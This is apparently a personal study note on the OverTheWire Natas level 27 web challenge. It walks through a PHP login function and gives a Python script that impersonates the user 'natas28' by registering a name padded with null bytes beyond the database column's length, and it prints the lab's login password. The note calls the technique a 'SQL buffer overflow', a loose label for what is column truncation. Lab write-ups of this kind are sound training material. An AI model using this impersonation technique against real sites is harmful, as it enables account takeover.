
2024-08-03 14:07

Source: #natas #web #py 

Tags: [[sql]] [[PHP]]
# aka SQL Buffer overflow 

we have a login page 

- HTML entities is PHP's notion and attempt to secure things down, like remove all the HTML entities if you were to try and do like cross-site scripting or inject HTML elements or JavaScript code into an input field's

- `mysql_real_escape_string` function is another PHP mitigation function that will try and lock down or protect a lot of regular sequel injection techniques

```php
function dumpData($link,$usr){ 
     
    $user=mysql_real_escape_string($usr); 
     
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            while ($row = mysql_fetch_assoc($res)) {  
                //return print_r($row); 
                return print_r($row,true); 
            } 
        } 
    } 
    return False; 
} 
```
it will return a number of rows and if it's greater than 0 we have multiple results, so what it does is it does this while loop that it iterates through every single row (this is peculiar right?) because we only expected it to return one result like if there's only one user we're trying to login as a specific user that would probably just be one, but what if we are in the case if there are multiple results if there are multiple rows to look through

since the DB described has a 64 varchar size, we create a user named longer than the length that is setup.


```python
import requests
username = 'natas27'
password = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'

url = 'http://natas27.natas.labs.overthewire.org/'  
session = requests.session()

response = session.post(url, data = {"username": "natas28" + "\x00"*58 +"x", "password": "12" },auth =(username,password))

response = session.post(url, data = {"username": "natas28" , "password": "12" },auth =(username,password))
print(response.text)
```

### References

writeups with correct answers - 
https://github.com/timruff/overthewire/blob/main/natas/natas27/exploit.py
https://www.youtube.com/watch?v=87BKWwGEF1Q

writeups with incorrect answers - 
https://www.youtube.com/watch?v=Y7WXxmWKfxs
https://axcheron.github.io/writeups/otw/natas/
https://ivanitlearning.wordpress.com/2020/02/02/overthewire-natas2729/

https://sqltest.net/ - we can just experiment with sequel database and a quick and easy way without spinning up a server.